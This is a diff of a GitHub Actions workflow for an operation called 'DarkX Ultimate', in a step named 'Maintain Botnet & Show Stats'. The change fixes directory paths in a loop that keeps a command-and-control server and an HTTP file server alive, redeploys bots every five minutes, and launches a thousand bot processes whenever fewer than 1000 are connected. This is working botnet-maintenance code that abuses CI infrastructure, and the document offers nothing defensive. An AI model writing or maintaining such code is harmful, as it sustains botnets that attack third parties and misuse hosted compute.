@@ -430,27 +430,31 @@ jobs:
         echo "=========================================="
         echo ""
 
-    - name: Maintain Botnet & Show Stats
+    - name: Maintain Botnet & Show Stats (Fixed Path)
       run: |
         echo "🛡️ DarkX Ultimate Active - Maintaining Massive Botnet"
         
+        # Store current directory
+        WORKSPACE="$GITHUB_WORKSPACE"
+        DARKX_DIR="$WORKSPACE/darkx"
+        
         # Start continuous deployment
-        cd darkx
+        cd "$DARKX_DIR"
         nohup bash -c 'while true; do ./deploy_bots.sh; sleep 300; done' > continuous_deploy.log 2>&1 &
         CONTINUOUS_PID=$!
         
         while true; do
-          # Check services
+          # Check services using absolute paths
           if ! ps -p $CNC_PID > /dev/null 2>&1; then
             echo "🔄 Restarting CNC Server..."
-            cd darkx
+            cd "$DARKX_DIR"
             nohup ./cnc > cnc_restart.log 2>&1 &
             CNC_PID=$!
           fi
           
           if ! ps -p $HTTP_PID > /dev/null 2>&1; then
             echo "🔄 Restarting HTTP Server..."
-            cd darkx
+            cd "$DARKX_DIR"
             python3 -m http.server 8000 > http_restart.log 2>&1 &
             HTTP_PID=$!
           fi
@@ -469,7 +473,7 @@ jobs:
           # Auto-scale if needed
           if [ $CONNECTED_BOTS -lt 1000 ]; then
             echo "➕ Auto-scaling bot deployment..."
-            cd darkx
+            cd "$DARKX_DIR"
             for i in {1..1000}; do
               nohup ./bot >/dev/null 2>&1 &
             done
